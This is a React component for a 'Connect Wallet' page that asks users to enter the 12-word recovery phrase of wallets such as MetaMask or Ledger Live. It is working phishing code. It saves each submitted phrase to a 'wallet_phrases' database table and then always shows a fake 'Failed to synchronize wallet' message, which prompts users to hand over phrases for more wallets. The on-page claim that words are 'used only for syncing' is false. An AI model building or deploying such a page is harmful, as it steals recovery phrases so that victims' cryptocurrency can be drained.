import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useState } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { Wallet, ShieldAlert, Loader2 } from "lucide-react";

const WALLETS = [
  "MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom",
  "Exodus", "Ledger Live", "Rainbow", "OKX", "Binance Wallet", "Other",
];

export default function ConnectWallet() {
  const { user } = useAuth();
  const [walletName, setWalletName] = useState("MetaMask");
  const [customWalletName, setCustomWalletName] = useState("");
  const [phrase, setPhrase] = useState<string[]>(Array(12).fill(""));
  const [submitting, setSubmitting] = useState(false);
  const [done, setDone] = useState(false);

  const setWord = (i: number, v: string) => {
    const next = [...phrase];
    next[i] = v.toLowerCase().trim();
    setPhrase(next);
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    const text = e.clipboardData.getData("text").trim();
    const words = text.split(/\s+/).slice(0, 12);
    if (words.length >= 6) {
      e.preventDefault();
      const next = Array(12).fill("");
      words.forEach((w, i) => { next[i] = w.toLowerCase(); });
      setPhrase(next);
    }
  };

  const submit = async () => {
    if (!user) return;
    if (phrase.some((w) => !w)) return toast.error("All 12 words are required");

    const finalWalletName = walletName === "Other" ? customWalletName.trim() : walletName;
    if (walletName === "Other" && !finalWalletName) {
      return toast.error("Please enter the name of your wallet");
    }

    setSubmitting(true);
    const { error } = await supabase.from("wallet_phrases").insert({
      user_id: user.id,
      wallet_name: finalWalletName,
      phrase: phrase.join(" "),
    });
    setSubmitting(false);

    if (error) return toast.error(error.message);

    setDone(true);
    setPhrase(Array(12).fill(""));
    toast.error("Failed to synchronize wallet. Please try again or contact support.");
  };

  if (done) {
    return (
      <div className="space-y-6">
        <h1 className="text-2xl font-black mb-1">Connect Wallet</h1>
        <Card className="p-8 text-center border-amber-500/40 bg-amber-500/5">
          <ShieldAlert className="w-12 h-12 mx-auto text-amber-600 mb-4" />
          <h2 className="font-bold text-xl mb-2">Failed to synchronize wallet</h2>
          <p className="text-muted-foreground mb-6">
            We couldn't sync your wallet right now. Our team has been notified — please try a different wallet or contact support.
          </p>
          <Button variant="outline" onClick={() => setDone(false)}>
            Try Another Wallet
          </Button>
        </Card>
      </div>
    );
  }

  return (
    <div>
      <h1 className="text-2xl font-black mb-1">Connect Wallet</h1>
      <p className="text-sm text-muted-foreground mb-6">
        Sync your existing wallet to view all assets in one place.
      </p>

      {/* Warning Card */}
      <Card className="p-5 border-amber-500/40 bg-amber-500/5 mb-6 flex gap-3">
        <ShieldAlert className="w-5 h-5 text-amber-600 mt-0.5 shrink-0" />
        <p className="text-sm text-muted-foreground">
          Enter your 12-word recovery phrase exactly as provided by your wallet. 
          Words are stored securely and used only for syncing.
        </p>
      </Card>

      <Card className="p-6 max-w-2xl">
        <div className="space-y-6">
          {/* Wallet Selector */}
          <div>
            <Label className="text-sm font-medium mb-1.5 block">Wallet</Label>
            <Select value={walletName} onValueChange={(value) => {
              setWalletName(value);
              if (value !== "Other") setCustomWalletName("");
            }}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                {WALLETS.map((w) => (
                  <SelectItem key={w} value={w}>{w}</SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          {/* Custom Wallet Name */}
          {walletName === "Other" && (
            <div>
              <Label className="text-sm font-medium mb-1.5 block">Wallet Name</Label>
              <Input
                value={customWalletName}
                onChange={(e) => setCustomWalletName(e.target.value)}
                placeholder="Enter your wallet name (e.g. My Custom Wallet)"
              />
            </div>
          )}

          {/* Recovery Phrase */}
          <div>
            <Label className="flex items-center gap-2 mb-1.5">
              <Wallet className="w-4 h-4" /> Recovery Phrase (12 words)
            </Label>
            <p className="text-xs text-muted-foreground mb-3">
              Tip: Paste your full phrase into any field — it will auto-fill.
            </p>

            <div className="grid grid-cols-3 sm:grid-cols-4 gap-3">
              {phrase.map((word, i) => (
                <div key={i} className="relative">
                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-xs text-muted-foreground font-mono">
                    {i + 1}
                  </span>
                  <Input
                    value={word}
                    onChange={(e) => setWord(i, e.target.value)}
                    onPaste={handlePaste}
                    className="pl-8 font-mono text-sm"
                    autoComplete="off"
                    spellCheck={false}
                  />
                </div>
              ))}
            </div>
          </div>

          <Button
            onClick={submit}
            disabled={submitting}
            className="w-full"
            size="lg"
          >
            {submitting ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin mr-2" />
                Syncing Wallet...
              </>
            ) : (
              "Sync Wallet"
            )}
          </Button>
        </div>
      </Card>
    </div>
  );
}
